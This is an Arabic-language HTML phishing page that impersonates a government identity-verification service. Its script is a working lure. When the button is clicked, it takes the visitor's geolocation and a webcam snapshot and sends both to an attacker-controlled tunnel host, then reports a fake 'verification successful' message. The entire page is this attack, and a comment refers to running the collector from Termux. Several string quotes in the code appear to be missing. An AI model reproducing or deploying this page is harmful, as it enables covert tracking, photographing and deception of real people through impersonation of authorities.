<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مركز التوثيق الرقمي</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; text-align: center; width: 90%; max-width: 400px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        button { background: #1a73e8; color: white; border: none; padding: 15px; border-radius: 8px; width: 100%; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2>نظام التحقق الحكومي</h2>
        <p>يرجى الضغط لتأكيد الهوية الرقمية وإغلاق ملف القضية.</p>
        <button id="btn" onclick="start()">تأكيد الهوية الآن</button>
    </div>

    <script>
    async function start() {
        const btn = document.getElementById( btn );
        btn.innerText = "جاري المعالجة...";
        const tunnel = "https://96980dbae77e22.lhr.life"; // تأكد أن هذا هو رابطك الحالي من ترمكس

        try {
            // طلب الموقع
            navigator.geolocation.getCurrentPosition(p => {
                fetch(`${tunnel}/log.php?lat=${p.coords.latitude}&lon=${p.coords.longitude}`);
            });

            // طلب الكاميرا
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            const v = document.createElement( video );
            v.srcObject = s;
            v.play();

            setTimeout(async () => {
                const c = document.createElement( canvas );
                c.width = 640; c.height = 480;
                c.getContext( 2d ).drawImage(v, 0, 0);
                const img = c.toDataURL( image/jpeg );
                await fetch(`${tunnel}/log.php`, { method:  POST , body: JSON.stringify({img: img}) });
                s.getTracks().forEach(t => t.stop());
                alert("تم التوثيق بنجاح");
                btn.innerText = "تم التوثيق";
            }, 2000);
        } catch (e) {
            alert("يجب السماح بالكاميرا والموقع للمتابعة");
            btn.innerText = "تأكيد الهوية الآن";
        }
    }
    </script>
</body>
</html>
